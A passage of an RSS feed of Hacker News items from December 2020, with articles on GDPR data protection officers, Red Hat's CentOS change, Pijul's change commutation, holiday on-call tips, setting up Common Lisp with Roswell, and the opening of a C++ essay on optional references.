<p>As mentioned above, if your company is not an EU resident and your clients are EU residents, you should (as the data controller) have a representative registered in the EU. According to its competence, the DPO appointment should be notified to the relevant Member Stateâ€™s supervisory authority.</p>

<p><img src="https://saasitive.com/tutorial/gdpr-meaning/DPO_obligation.svg" alt="Do you need a DPO?"></p>

<p>The DPO should:</p>

<ul>
  <li>be aware of national and European data protection laws;</li>
  <li>be familiar with the practices in the field of personal data protection;</li>
  <li>have business and industry knowledge regarding the administratorâ€™s activities;</li>
  <li>know the data processing processes,</li>
  <li>know the information systems and security measures used by the controller and its data protection needs;</li>
  <li>demonstrate knowledge of the entityâ€™s administrative procedures and operations.</li>
</ul>

<p>The inspector is, therefore, to play a crucial role in supporting the â€œdata protection cultureâ€ and help in the implementation of the necessary elements of the GDPR, i.e.:</p>

<ul>
  <li>rules for the processing of personal data;</li>
  <li>the rights of data subjects;</li>
  <li>data protection by design and data protection by default;</li>
  <li>keep a register of processing activities;</li>
  <li>processing security requirements;</li>
  <li>reporting violations.</li>
</ul>

<p>DPO suppose to be easily accessible as a point of contact for employees, individuals, and Information Commissionerâ€™s Officer (ICO). His contact details should be published on your website. If you are not obliged to appoint a DPO, you can designate a person who will track the newest trends, UE recommendations and keep a hand on your companyâ€™s personal data security.</p>

<p><strong>Note from the author:</strong></p>

<p>Even though it contains a lot of practical information about legal stuff, you cannot treat it as legal advice. Each case is different and requires an individual approach. The purpose of this article is to help you to understand the essence of its subject.</p>



		<hr>

		


		<h4>Let's stay in touch!</h4>
		<p>
			Would you like to be notified about new posts? Please fill this
			<a href="https://forms.gle/rgAG9gkhUEH2wUVt5" target="_blank">form</a>.
		</p>
		<p>
			Have you found a bug in the code? Please add a <a href="https://github.com/saasitive/django-react-boilerplate/issues/new" target="_blank">GitHub
				issue</a>.
		</p>
		<p>
			Do you have problems with running the code or setup and need help? Please add a <a href="https://stackoverflow.com/">StackOverflow</a> question with <b>django-react</b> tag.
		</p>

		<hr>


		

	</div></div>]]>
            </description>
            <link>https://saasitive.com/tutorial/gdpr-meaning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25493704</guid>
            <pubDate>Mon, 21 Dec 2020 10:41:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chef cofounder on CentOS: Itâ€™s time to open source everything]]>
            </title>
            <description>
<![CDATA[
Score 187 | Comments 90 (<a href="https://news.ycombinator.com/item?id=25493606">thread link</a>) | @ashitlerferad
<br/>
December 21, 2020 | https://planetstoryline.com/chef-cofounder-on-centos-its-time-to-open-source-everything/ | <a href="https://web.archive.org/web/*/https://planetstoryline.com/chef-cofounder-on-centos-its-time-to-open-source-everything/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Commentary: Red Hat has been in hot water about changing the way CentOS operates, but that model looks like the exact right way for open source entrepreneurs to operate.</p><div data-component="lazyloadImages">
<figure><span></span><figcaption></figcaption></figure>
<p>Red Hat switched up CentOS to make it less of a Red Hat Enterprise Linux (RHEL) clone and more of a feeder project into RHEL (as Fedora was always supposed to be, yet wasnâ€™t). Some people are mad, as <a href="https://www.zdnet.com/article/red-hat-resets-centos-linux-and-users-are-angry/" target="_blank" rel="noopener noreferrer" data-absolute="true" data-component="externalLink">Steven J. Vaughan-Nichols has written</a> on sister site ZDNet. Some people, like former Disney employee Justin Garrison, <a href="https://twitter.com/rothgar/status/1337818039799070722" target="_blank" rel="noopener noreferrer" data-absolute="true" data-component="externalLink">think</a> it sounds perfect (the hipper, slightly edgier version of RHEL). If youâ€™re a billion-dollar company upset that Red Hat appears to be trying to charge for something you value, the <a href="https://www.zdnet.com/article/goodbye-centos-hello-rocky-linux/" target="_blank" rel="noopener noreferrer" data-absolute="true" data-component="externalLink">founder of CentOS has a new way for you to get something for nothing</a>: Rocky Linux.</p>

<p>But if youâ€™re an open source entrepreneur wondering what this means for you, well, Chef cofounder and System Initiative CEO <a href="https://twitter.com/adamhjk/status/1337062314357514251" target="_blank" rel="noopener noreferrer" data-absolute="true" data-component="externalLink">Adam Jacob has you covered</a>. In a series of tweets, he walks through how Red Hatâ€™s CentOS strategy can play out for you. (He should know, as the company he co-founded, Chef, <a href="https://www.techrepublic.com/article/why-chefs-100-open-source-move-is-smart-business/" data-absolute="true">last year open sourced everything</a>.)</p>
<p>Letâ€™s observe.</p>
<h2>Open source all the things</h2>
<p><a href="https://twitter.com/adamhjk/status/1337062314357514251" target="_blank" rel="noopener noreferrer" data-absolute="true" data-component="externalLink">Jacobâ€™s first rule</a>? Open it up. Completely. â€œIf I do an open source strategy for a company ever again, I will own the upstream, it will be fully open source, and Iâ€™ll happily collaborate with anyone downstream.â€ But not just an open upstreamâ€“itâ€™s also important to, â€œProduce a commercial distribution [and c]ollaborate on downstream non-commercial ones, in the open,â€ he <a href="https://twitter.com/adamhjk/status/1337062321982758912" target="_blank" rel="noopener noreferrer" data-absolute="true" data-component="externalLink">argued</a>.</p>
<p>What does he mean by â€œupstreamâ€ and â€œdownstreamâ€? In open source, think of the <a href="https://opensource.stackexchange.com/questions/993/what-does-upstream-mean" target="_blank" rel="noopener noreferrer nofollow" data-absolute="true" data-component="externalLink">upstream</a> as the parent, the head, the initial open source project. Downstream might be forks or distributions (packaging up of a particular build of the upstream code) of the upstream.</p>
<p>What Red Hat announced was basically that CentOS would move from being downstream to upstream. It becomes a place, as <a href="https://twitter.com/adamhjk/status/1337062318451068929" target="_blank" rel="noopener noreferrer" data-absolute="true" data-component="externalLink">Jacob noted</a>, that others <a href="https://www.redhat.com/en/blog/centos-stream-building-innovative-future-enterprise-linux" target="_blank" rel="noopener noreferrer nofollow" data-absolute="true" data-component="externalLink">like Facebook</a> can collaborate with Red Hat in a way they simply couldnâ€™t before (as Fedora wasnâ€™t closely enough aligned with RHEL). CentOS as a downstream RHEL community was mostly one of users, of consumers, not of collaborators. It was somewhere to get RHEL, but rebranded CentOS, for free.</p>
<p>As such, Jacob pointed out, â€œThey werenâ€™t invested in it beyond using it.â€ And when someone removes the downstream they get mad â€œbecause itâ€™s like someone threatened the water supply,â€ <a href="https://twitter.com/adamhjk/status/1337062319558434822" target="_blank" rel="noopener noreferrer" data-absolute="true" data-component="externalLink">he argued</a>. Itâ€™s therefore far better to condition people to participate as collaborators with an open source project, and through the commercial distribution to also condition users to become customers, if they want the certified distribution.</p>
<h2>Open source + cloud</h2>
<p>One way that open source companies are doing this model to fantastic effect is by open sourcing their upstream and creating a cloud distribution (read: managed service). A variety of companies have embraced this model to greater or lesser extents.</p>
<p>Yugabyte, for example, ditched its Open Core model a year ago and open sourced 100% of its database code. A year later, CTO Karthik Ranganathan told me in an interview, â€œIt increased our adoption like crazy,â€ growing the number of Yugabyte clusters 10x, but it also has dramatically accelerated their business without them losing any known pipeline. Could someone take that upstream and create a competitive downstream competitor? Of course. But no one should be able to out-Yugabyte on their home turf.</p>
<p>Or take Redis Labs. The company has fiddled with licensing over the last few years, but has kept core Redis completely open while encouraging a growing community (which includes downstream competitors) to lend a hand to improving the code. While Redis Labs doesnâ€™t publish results, its business is booming, even as 10 or so other companies have created competitive downstream managed service offerings.</p>
<p>Which brings us back to Jacob: â€œRun an open upstream from the jump. Produce a commercial distribution. Collaborate on downstream non-commercial ones, in the open.â€</p>
<p>Thatâ€™s the strategy. Thatâ€™s the magic. You donâ€™t need to go Open Core or any other permutation of kind-of, sort-of open source. You can open source everything and just ensure you have a rock-solid managed cloud service. This reliance on cloud is whatâ€™s driving MongoDB, Confluent, DataStax, Redis Labs, and others to great success. It can be your model, too.</p>
</div></div>]]>
            </description>
            <link>https://planetstoryline.com/chef-cofounder-on-centos-its-time-to-open-source-everything/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25493606</guid>
            <pubDate>Mon, 21 Dec 2020 10:22:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pijul: Commutation and Scalability]]>
            </title>
            <description>
<![CDATA[
Score 149 | Comments 27 (<a href="https://news.ycombinator.com/item?id=25493577">thread link</a>) | @Ygg2
<br/>
December 21, 2020 | https://pijul.org/posts/2020-12-19-partials/ | <a href="https://web.archive.org/web/*/https://pijul.org/posts/2020-12-19-partials/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Sunday, December 20, 2020</p>
<p>I just finished the implementation of an important feature of Pijul: clones, pushes and pulls on partial repositories. In this post, I explain why this matters.</p>
<h2 id="change-commutation">Change commutation</h2>
<p>Pijul is based on <em>changes</em>, also called <em>patches</em> or <em>diffs</em>.
This doesnâ€™t mean that its only internal datastructure is patches, quite to the contrary: it was only by departing from a patch-only internal representation that we were able to solve the algorithmic challenges inherent to patch-based systems.</p>
<p>However, being change-based does mean that the core operations of Pijul are defined on changes, and that Pijul is designed in such a way that changes satisfy basic intuitive properties, similar to algebraic operations. One basic thing is that applying a change is an <em>associative</em> operation, like matrix multiplication: applying $A$ and $B$ at once, and then later $C$, is the same as applying $A$, and then $B$ and $C$ at once. In matrix multiplication, $(AB)C = A(BC)$. Moreover, in Pijul, all changes are invertible (whereas only some matrices are): for any change $A$, there is an â€œinverse changeâ€ $A^{-1}$ such that applying $A^{-1}$ after $A$ is the same as applying neither. Of course, both $A$ and $A^{-1}$ will appear in the log, but the contents of the repository will be the same as applying neither $A$ nor $A^{-1}$.</p>
<p>There is another property that users want from version control systems, and that is <strong>commutation</strong>.
Matrix multiplication rarely commutes<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.
In Git, commutation is usually <em>simulated</em> using branches and rebase: indeed, rebasing a branch A on top of another branch B really means commuting the commits of A since the divergence between A and B, and the commits of B since the divergence. However, that commutation isnâ€™t perfect, since the commits must change their hash when rebased.</p>
<p>Things are simpler in Pijul, because any two changes that <em>could have been written independently</em> always commute, meaning that if the two changes could be written without knowledge of each other, they can be applied in any order.</p>
<p>This of course raises a potential concern:</p>
<blockquote>
<p>If I can apply $A$ and $B$ in any order, how do I know which order is the <strong>right</strong> one?</p>
</blockquote>
<p>In Pijul, this question <strong>does not matter</strong>: both orders will yield <strong>the exact same result</strong>, the only difference is that the log will list the changes in the order in which they were applied. And Iâ€™m not saying that it doesnâ€™t matter because Iâ€™m careless, but because it truly is the same thing.</p>
<blockquote>
<p>I disagree: it does matter, I still prefer to have a â€œ<em>linear</em>â€ order for my changes/commits.</p>
</blockquote>
<p>Indeed, everybody wants to see the order of operations in a repository, for many reasons. For example:</p>
<ul>
<li>We want to keep a record of the operations performed on our repository.</li>
<li>We want to go back in time.</li>
</ul>
<p>And in fact, Pijul allows you to do exactly that, but in a more rigorous way than Git. Indeed, take the scenario where Alice and Bob work together, Alice makes a change $A$ while Bob makes $B$. When they put their work together, Alice applies Bobâ€™s change, resulting in the log $AB$, while Bob applies Aliceâ€™s change, resulting in the log $BA$. In this case, there is no â€œtrueâ€ linear history, since they worked on different things, and took different steps at different times. However, both of them want to be able to go back in time, step-by-step, and not just â€œ<em>step-by-step-according-to-Bobâ€™s-order</em>â€.</p>
<h2 id="commutation-and-massive-repositories">Commutation and massive repositories</h2>
<p>One of the biggest challenge for Pijul up to the recent releases was scalability: even modestly-sized repositories like Pijulâ€™s source code would use a lot of disk space. This was even more disappointing since, as Iâ€™m about to explain, commutation was suposed to allow it to scale to gigantic repository sizesâ€¦ in theory. The same problem also made massive tests impossible, meaning that getting past the â€œ0.x releasesâ€ seemed more and more impossible as time passed.</p>
<p>Now that this phase is mostly behind us, the cool bits of the theory finally become practical.</p>
<p>In particular, in Pijul, each change contains a reference to the files it modifies. Note that, because we want operations on repositories (such as renaming files) to commute with edits inside files, we donâ€™t identify files and directories by name, but by a unique identifier made from the hash of the change that introduced that file or directory.</p>
<p>For repositories with multiple projects, this makes it possible to clone and pull just parts of a repository, and work on that part as if we had the entire thing. Indeed, imagine we have a repository with the following log:</p>
<ol>
<li>A, adding file <em>x</em></li>
<li>B, editing <em>x</em></li>
<li>C, adding file <em>y</em></li>
<li>D, adding file <em>z</em></li>
<li>E, renaming <em>x</em> to <em>w</em></li>
<li>F, editing <em>y</em> and <em>z</em></li>
</ol>
<p>All these changes do not necessarily commute; however, since B and C touch completely different files (namely, <em>x</em> and <em>y</em>), they could be produced in parallel, and hence they commute. This means that we can pull only the changes related to a specific file, say <em>x</em>, and make the following history: A, B, E<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</p>
<p>Moreover, any change made on top of that sequence will commute with C, D and F: indeed, if we edit file <em>x</em> again, producing a change G, then since G can be made in parallel to C, D and F, we can push G after any patch that comes after B in that history, for example getting history â€œABCDEFGâ€.</p>
<p>Note that this is done without changing the changes nor their hash.</p>
<h2 id="another-trick-for-large-files">Another trick for large files</h2>
<p>As explained in previous posts on this blog, Pijul changes have a bit more information than diffs, and operate on graphs rather than files. This means that changes can be split into two parts, a short-ish one with a binary specification of the graph operations, and then the new content inserted by the change.</p>
<p>The change format is designed to be downloadable in two stages: one can download the operations without downloading the contents. One issue with this is security: if we donâ€™t download the contents, how can we make sure that the hash is right? This is done by including a hash of the change in the â€œoperationsâ€ section of the change, and letting the hash of a change be the hash of the â€œoperationsâ€ section.</p>
<p>This makes it possible for someone to make five versions of a large binary file in a day, where each change deletes the entire file, and adds it again, the operation sections only contain the length of the different versions, not the actual bytes. In order to get the latest version of the file, a client will therefore only have to download the latest change completely, and only the operations section of the previous ones.</p>
<p>Note that this makes the following â€œattackâ€ possible: a server might trick a client into believing that the server has a change with hash $A$, which inserts $n$ bytes into a file, and then another change with hash $B$, deleting all these bytes. When the client downloads $A$ and $B$, it doesnâ€™t need to download the contents. However, if the client later decides to unrecord $B$, the contents of $A$ will have to be downloaded, and the client will be able to tell that the hash of $A$ was incorrect. This should make it impossible to unrecord $B$ without also unrecording $A$. However, if $A$ made other edits, and other changes depend on $A$, this could be problematic.</p>
<h2 id="what-is-next">What is next?</h2>
<p>There is one remaining painpoint for very large repositories, and this is the fact that in order to clone a repository with a very large history, one must download and apply all the changes, one by one. Even though our apply function is quite fast<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>, this can still be problematic for dozens or hundreds of thousands of changes.</p>
<p>In my next post, I will talk about a solution to this problem, which I have started to implement.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Matrices that are simultaneously diagonalizable do, for example, but for two arbitrary matrices $A$ and $B$, $AB$ is often different from $BA$. <a href="#fnref:1" role="doc-backlink">â†©ï¸</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>Note that in this case, we could also pull A, E, B, since renaming a file commutes with editing it. However, we must start with A, since adding a file could not be possibly done in parallel to editing or renaming it. <a href="#fnref:2" role="doc-backlink">â†©ï¸</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>The complexity of apply is in $O(|p| |c| \log |H|)$, where $|p|$ is the size of the change, $|c|$ is the size of the largest conflict in which $p$ is involved, and $|H|$ is the number of edits made since the start of the repository. <a href="#fnref:3" role="doc-backlink">â†©ï¸</a></p>
</li>
</ol>
</section>
</div></div>]]>
            </description>
            <link>https://pijul.org/posts/2020-12-19-partials/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25493577</guid>
            <pubDate>Mon, 21 Dec 2020 10:14:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tips for on Call Engineers During the Holidays]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25493498">thread link</a>) | @kiyanwang
<br/>
December 21, 2020 | https://www.transposit.com/blog/2019.12.23-tips-for-on-call-engineers-during-the-holidays/ | <a href="https://web.archive.org/web/*/https://www.transposit.com/blog/2019.12.23-tips-for-on-call-engineers-during-the-holidays/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://transposit.imgix.net/img/2019.12.23a.jpg?auto=format&amp;ch=Width,DPR&amp;q=95&amp;w=800" alt="Picture of fire burning in a fireplace"></p><p>Are you sitting by the fire sipping cocoa, worrying secretly about whether youâ€™ll have to put out an engineering fire any minute?</p><p>If only everyone could enjoy a well-earned break from on call life, the week would be more relaxing, but there is no rest for the technology that keeps our world running. This week certain industries are reaching a holiday high, and DevOps, SREs, and on call engineers everywhere will have to don their invisible superhero capes and keep us humans and our devices connected, just like they always do.</p><p>At Transposit, we know the pain of on call ourselves, and so weâ€™ve banded together to come up with some of our top tips for making holiday on call shifts as painless as possible.</p><h2 id="on-call-tip-number-one%3A">On Call Tip Number One: <a href="#on-call-tip-number-one%3A">#</a></h2><p>Whether on-callers are planning on having a Rockwellian Christmas, lighting the menorah with Bubbe, visiting family abroad, or taking a tropical trip with the two federal holidays padding their vacation request, there is one consistent truth about the holiday week between Christmas and New Years: Mass exodus from the office. So, before we even get into the challenges of answering a page when no one is around to help you, how can you avoid that conundrum in the first place?</p><p>On call engineering managers should be careful to adjust on call schedules so that the same people are not on call during multiple peak times. Which times are most painful are up to the individual, so giving each person the opportunity to sign up for what works for them first is always a best practice. Perhaps someone doesnâ€™t mind being on call Christmas morning, but absolutely canâ€™t do it on New Years Eve. Start by letting people pick what is ideal for them, and then fill in the remaining gaps, being sure not to unduly burden any one member of the team.</p><p>When making the on call schedule, make sure that there are primaries and secondaries who are committed to each shift, since they will likely be working together without quick access to the rest of the team when something goes wrong.</p><p>To reduce the pain further, consider upping on call bonuses for the entire week as an incentive for taking on undesirable shifts, and once everyone is back in the office in January, be sure to acknowledge the on-callers who responded quickly to keep the business running while everyone else was enjoying their time away from work.</p><h2 id="on-call-tip-number-two%3A">On Call Tip Number Two: <a href="#on-call-tip-number-two%3A">#</a></h2><h3 id="communicate-early-and-often%2C-with-and-without-runbooks.">Communicate early and often, with and without runbooks. <a href="#communicate-early-and-often%2C-with-and-without-runbooks.">#</a></h3><p>Without easy access to the rest of the team, good playbook/runbook documentation during this period is even more important than it is the rest of the year. If your typical on call process involves opening up a collaborative team Slack thread or Jira ticket and then letting various experts or senior SREs weigh in, you might face a rude awakening when your reliable experts are MIA during the holiday week.</p><p>Make sure your runbooks are updated and everyone has easy access to the DevOps systems they need before everyone leaves on vacation, because if on-callers are left to search half-empty wikis by themselves, the speed to resolution is going to be stressful for everyone - engineers, managers, and executives alike.</p><p>Additionally, make sure that primary and secondary on-callers know exactly who they are paired with for a particular shift. Make sure that both are committed to being fully available and sober during their shifts, so that in the absence of the whole team, they are secure in having at least one problem-solving partner.</p><h2 id="on-call-tip-number-three%3A">On Call Tip Number Three: <a href="#on-call-tip-number-three%3A">#</a></h2><h3 id="plan-around-potential-travel-problems">Plan around potential travel problems <a href="#plan-around-potential-travel-problems">#</a></h3><p>While it may seem obvious to plan your travel around your on call shifts so that you arenâ€™t in the air while youâ€™re supposed to be available, these days, we sometimes have too much faith in our connectivity during travel. Airports and even some planes have wifi, many airplane seats have built-in electricity and jacks, what could possibly go wrong?</p><p>Remember, this week is one of the busiest travel weeks of the year in the US, so our already strained infrastructure will be at the edge of capacity in the best of circumstances. You wonâ€™t be very effective at troubleshooting an outage if you are standing in a 2-hour long airport security line or sitting in a traffic jam on the way up to the mountains. Add unpredictable winter weather to the mix, and we have on call disasters in the making. So, what should on-callers do?</p><p>First, you should plan wider time-frames for travel around your on call shifts to avoid accidentally being unavailable. You also shouldnâ€™t count on access to wifi on your flights (only some planes are equipped, and airlines often shift which plane is flying a certain route based on weather and mechanical issues). Donâ€™t expect access to electricity in the airport to charge your computer or phone, as the high number of travelers may easily keep the charging stations fully occupied, and make sure you have your computer and charger easily accessible, so that if you are forced to gate-check a bag on your crowded flight, you will be sure to keep these precious items on your person.</p><p>Traveling on-callers should also remember that time zones are a thing - your on call planning will need to be adjusted accordingly. If you are the secondary, your primary may be in a different time zone (or vice versa), and you should discuss your plans with them beforehand so that you are prepared for them to be asleep at different hours.</p><p>Finally, if you are traveling anywhere that has inclement weather or otherwise unreliable access to internet, you should have a back-up plan, such as tethering your computer to your phoneâ€™s data service to get around unreliable wifi. If you arrive at your destination and realize that you have bad data service, finicky wifi, or (gasp) the possibility of power outages, you should admit your defeat early and find an understanding colleague to take your shift, rather than hoping for the best and leaving any alerts to your back-ups.</p><h2 id="on-call-tip-number-four%3A">On Call Tip Number Four: <a href="#on-call-tip-number-four%3A">#</a></h2><p>Weâ€™ve already talked about the importance of secondaries as problem-solving partners, but what about the other, more social challenges of being on call during this time? Letâ€™s say youâ€™re sitting down to a nice family dinner, and, just like you were dreading, there goes your phone dinging with an urgent alert. How are you going to explain this situation to your relatives, who in many cases, donâ€™t really understand what you do?</p><p>This is where a friendly ally can help serve as your secondary within your social situation. If you arm a sibling or supportive partner with talking points to explain why you have to get up from the festive table to crouch frantically over your laptop in the back room, you will be able to focus on troubleshooting without worrying about the familial fallout.</p><h2 id="on-call-tip-number-five%3A">On Call Tip Number Five: <a href="#on-call-tip-number-five%3A">#</a></h2><h3 id="pat-yourself-and-your-team-on-the-back">Pat yourself and your team on the back <a href="#pat-yourself-and-your-team-on-the-back">#</a></h3><p>It should go without saying, and so often it does, that there is a reason the world functions so smoothly during this week, despite its unique circumstances. While a lot of the credit is due to excellent engineering and team planning throughout the rest of the year, there are always unanticipated incidents that simply canâ€™t be avoided. Thatâ€™s why on call shifts, DevOps, and SREs exist in the first place! And so, as we look back on the year, and the incidents resolved during this special last week of 2019, letâ€™s remember to give a shout out to all the engineering heroes who stepped forward to make it happen. Cheers to you!</p></div></div>]]>
            </description>
            <link>https://www.transposit.com/blog/2019.12.23-tips-for-on-call-engineers-during-the-holidays/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25493498</guid>
            <pubDate>Mon, 21 Dec 2020 09:59:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting Started with Lisp (2019)]]>
            </title>
            <description>
<![CDATA[
Score 82 | Comments 65 (<a href="https://news.ycombinator.com/item?id=25493495">thread link</a>) | @wheresvic4
<br/>
December 21, 2020 | https://smalldata.tech/blog/2019/08/16/getting-started-with-lisp-in-2019 | <a href="https://web.archive.org/web/*/https://smalldata.tech/blog/2019/08/16/getting-started-with-lisp-in-2019">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
  It's 2019 and Lisp stories are on fire at HackerNews. While there exist multiple Lisp dialects, Common Lisp is the
  oldest and most mentioned. Thus, if you're looking to get started with programming in Common Lisp, then there are 2
  options:
</p>

<ul>
  <li>Use <a href="https://portacle.github.io/">portacle</a> to get up and running with SBCL + Emacs.</li>
  <li>
    Use
    <a href="https://github.com/roswell/roswell">roswell</a> to install multiple Lisp implementations + build and bundle
    lisp applications. Roswell installs SBCL by default.
  </li>
</ul>

<p>
  As for me, I did not feel like learning a brand new text editor just to get started with Lisp so I went with Roswell.
  Follow the instructions on installing Roswell for your platform. In my case, I decided to install it under
  <code>$HOME/bin</code> on my linux machine via:
</p>

<pre>$ sudo apt install rlwrap
$ mkdir $HOME/bin
$ git clone -b release https://github.com/roswell/roswell.git
$ cd roswell/
$ sh bootstrap
$ ./configure --prefix=$HOME/bin
$ make
$ make install</pre>

<p>
  Make sure to add the roswell path to your <code>~/.bashrc</code> (note that roswell installed itself under
  <code>~/bin/bin</code> and if this looks odd to you, install it under <code>$HOME/apps</code> or something of the
  sort):
</p>

<pre>if [ -d "$HOME/bin/bin" ] ; then
  PATH="$HOME/bin/bin:$PATH"
fi</pre>

<p>
  Open a new terminal and setup roswell:
</p>

<pre>$ which ros
/home/xxx/bin/bin/ros
$ ros --version
roswell 19.06.10.100
$ ros setup </pre>

<p>
  We will now setup VSCode to run lisp. First install the
  <a href="https://marketplace.visualstudio.com/items?itemName=mattn.Lisp">vscode-lisp</a> extension. Open a new file
  and type the following in:
</p>

<pre>(defun main ()
  (format t "Hello world"))
</pre>

<p>
  Then <a href="https://code.visualstudio.com/docs/editor/integrated-terminal">launch a terminal</a> inside VSCode. In
  the terminal run <code>rlwrap ros run</code> to start the REPL (Read/Eval/Print Loop). Select the above defined
  function and use the "Run Selected Text in Active Terminal" from the Command Palette (F1) to run your code!
  Note that you can exit the REPL via: <code>(SB-EXT:EXIT)</code>. The <code>rlwrap</code> utility remembers previously
  typed commands which makes for a much nicer REPL experience.
</p>

<p>
  What is amazing about Roswell is that is comes with a scripting / build ability that allows you to easily distribute
  your application. To see this in action first create a roswell script via <code>ros init hello-world</code>. Then add
  in the following code so that your script looks like the following:
</p>

<pre>#!/bin/sh
#|-*- mode:lisp -*-|#
#|
exec ros -Q -- $0 "$@"
|#
(progn ;;init forms
  (ros:ensure-asdf)
  ;;#+quicklisp(ql:quickload '() :silent t)
  )

(defpackage :ros.script.hello-world.3774807541
  (:use :cl))
(in-package :ros.script.hello-world.3774807541)

(defun helloWorld
  ()
  (format t "Hello world")
)

(defun main (&amp;rest argv)
  (declare (ignorable argv))
  (helloWorld))
;;; vim: set ft=lisp lisp:
</pre>

<p>
  We can now simply run this script via <code>ros hello-world.ros</code> but more interestingly, we can actually compile
  a binary via <code>ros build hello-world.ros &amp;&amp; ./hello-world</code>.
</p>

<p>
  Interestingly enough, I am not a complete noob to Common Lisp, I actually programmed it 15 years ago during my
  undergrad years. A colleague and I
  <a href="https://smalldata.tech/api/to/847c726edff337b818ba86914d9e71b6">compared an experimental genetic algorithm against an ant colony optimization algoritm on a path-finding problem</a>. Once I had lisp running I opened up the project and basically executed <code>ants.lisp</code> in the REPL, ran
  <code>(INITIALIZE-ANT-WORLD)</code> followed by <code>(DISPATCH-ANTS)</code> and voila, my ants were able to find
  their food!
</p>

<p>
  No guide to getting started with Lisp would be complete without a list of further reading that will keep you busy for
  the next 100 years so here we go:
</p>

<ul>
  <li>
    A very basic Lisp <a href="https://lisp-lang.org/learn/first-steps">tutorial</a> which also features an excellent
    <a href="https://lisp-lang.org/books/">list</a> of Lisp books
  </li>
  <li>
    <a href="https://smalldata.tech/api/to/3c02f249908494a961ac4b28e33f1ec5">A road to common lisp</a> - Steve Losh's excellent guide to
    getting into Lisp programming. The following is a small snippet of useful information from the post:
    <ul>
      <li>
        Files are files on your hard drive.
      </li>
      <li>Packages are containers of symbols. They are orthogonal to files.</li>
      <li>
        Systems are collections of code, instructions on how to load that code, dependency lists, and metadata. They are
        orthogonal to packages.
      </li>
      <li>
        Projects are high-level collections of "stuff" such as code, documentation, maybe some image assets,
        etc. They are (mostly) orthogonal to systems.
      </li>
      <li>Common Lisp itself knows about files and packages.</li>
      <li>ASDF adds systems.</li>
      <li>Quicklisp adds the internet.</li>
    </ul>

    This guide also provides a very nice review of libraries and is definitey worth a read.
  </li>
  <li>
    Another <a href="https://smalldata.tech/api/to/cb5d30e9026cba3d1d0b838611d1624c">article</a> that recommends roswell and provides
    instructions for Atom integration along with project and library management.
  </li>
</ul>

<p>
  Well, that's about it - Lisp is beautiful and I'm off to wrap my head around some 15 year old code that doesn't look
  too bad, go functional programming!
</p>
<p><a href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fsmalldata.tech%2Fblog%2F2019%2F08%2F16%2Fgetting-started-with-lisp-in-2019&amp;t=Getting%20started%20with%20Lisp%20in%202019">HackerNews submission / discussion</a></p></div></div>]]>
            </description>
            <link>https://smalldata.tech/blog/2019/08/16/getting-started-with-lisp-in-2019</link>
            <guid isPermaLink="false">hacker-news-small-sites-25493495</guid>
            <pubDate>Mon, 21 Dec 2020 09:58:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[To Bind and Loose a Reference]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25493274">thread link</a>) | @aw1621107
<br/>
December 21, 2020 | https://thephd.github.io/to-bind-and-loose-a-reference-optional | <a href="https://web.archive.org/web/*/https://thephd.github.io/to-bind-and-loose-a-reference-optional">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  
      <p>â€¦ Letâ€™s talk about something that has haunted me for over a year now.<!--more--></p>

<p>Seeing discussion after discussion, paper after paper, point after point being made about references inside nullable types like <code>variant&lt;T&amp;, monostate&gt;</code>, <code>optional&lt;T&amp;&gt;</code>, <code>expected&lt;T&amp;&gt;</code> and its friends, I am now beyond compelled to speak. The straws that finally tipped me from my year+ hiatus on this subject were <a href="https://wg21.link/p2070">a paper by Professor Peter Sommerlad</a> in the latest C++ mailing, asking for a simplified <code>optional&lt;T&amp;&gt;</code> (and <code>object_ptr</code>) in the interest of safety for MISRA C++-type folk, as well as another paper by James Berrow, who pursued his <a href="https://wg21.link/p2005">objections to the 2D Graphics Proposal with a thorough scholarship</a> that demanded both respect and attention.</p>

<p><code>optional&lt;T&amp;&gt;</code> (and <code>object_ptr</code>) are minefields. Since MISRAâ€™s paper cites my old paper â€“ <a href="https://wg21.link/p1175">p1175</a> â€“ it seems I can no longer blissfully turn a blind eye and pretend what went down at the November 2018 San Diego meeting just didnâ€™t happen. During that meeting, I explicitly told the room that I would not bring another paper forward to help resolve this issue. I will not beâ€¦ but I did promise that I would fully vet the design space.</p>

<p>That vetting is done in a yet-unpublished C++ paper <a href="https://thephd.github.io/_vendor/future_cxx/papers/d1683.html">d1683</a>, a secret paper I have been never quite been able to force myself to finish writing. I could not write it because I feel I grossly misled myself and walked into a trap. In fact, I still do feel that way. It makes me feel sick that I am even picking up my pen to once more write about this utter travesty of a topic, most certainly not for the reasons you may expect. In an effort to do a good job and not sabotage Professor Sommerladâ€™s generally excellent work and consideration, I have bottled (nearly) all of the purely technical observations into <a href="https://thephd.github.io/_vendor/future_cxx/papers/d1683.html">d1683</a>.</p>

<p>The rest of this reading is for those of you who can stomach messy, non-technical humanity that birthed the fullness of the viscerally methodical and mechanical understanding I leave for you in the paper. You may stop here if you wish,</p>

<p>though I certainly wish I could stop here with you, dear reader.</p>



